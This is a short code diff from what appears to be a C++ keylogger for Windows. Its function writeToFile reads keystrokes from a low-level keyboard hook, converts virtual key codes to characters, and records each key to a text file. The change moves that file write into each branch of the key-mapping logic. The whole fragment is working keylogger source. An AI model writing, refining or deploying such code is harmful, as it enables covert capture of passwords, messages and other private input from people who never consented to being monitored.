@@ -60,14 +60,17 @@ void writeToFile(LPKBDLLHOOKSTRUCT& keypress){
     else if (shift && keypress->vkCode == 0x38) key = '*';
     else if (shift && keypress->vkCode == 0x39) key = '(';
     else key = keypress->vkCode;
+    textfile << key;
   }
   // Key pressed is in uppercase
   else if (shift && keypress->vkCode >= 65 && keypress->vkCode <= 90){
     key = keypress->vkCode;
+    textfile << key;
   }
   // Key pressed is in lowercase
   else if (!shift && keypress->vkCode >= 65 && keypress->vkCode <= 90){
     key = (keypress->vkCode) + 32;
+    textfile << key;
   }
   // Account for some other keys
   else{
@@ -82,8 +85,8 @@ void writeToFile(LPKBDLLHOOKSTRUCT& keypress){
     else if (keypress->vkCode == VK_OEM_5) shift == true ? key = '|' : key = '\\';
     else if (keypress->vkCode == VK_OEM_6) shift == true ? key = '}' : key = ']';
     else if (keypress->vkCode == VK_OEM_7) shift == true ? key = '"' : key = '\'';
+    textfile << key;
   }
-  textfile << key;
 }
 
 int main (){
